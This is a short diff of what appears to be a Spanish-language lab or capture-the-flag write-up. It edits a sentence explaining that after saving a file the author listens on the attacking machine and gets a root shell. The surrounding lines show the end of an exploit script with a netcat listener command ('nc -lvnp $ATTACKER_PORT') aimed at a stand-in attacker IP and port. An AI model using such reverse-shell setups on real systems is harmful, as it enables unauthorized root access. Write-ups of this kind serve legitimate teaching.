@@ -160,4 +160,4 @@ echo -e "\n[*] ¡Listo! Asegúrate de tener un listener en $ATTACKER_IP:$ATTACKE
 echo "    Ejemplo: nc -lvnp $ATTACKER_PORT"
 ```
 
-Una vez explotado lo 
+Una guardado nos pondremos en escucha en nuestra maquina atacante y obtendremos una shell como root
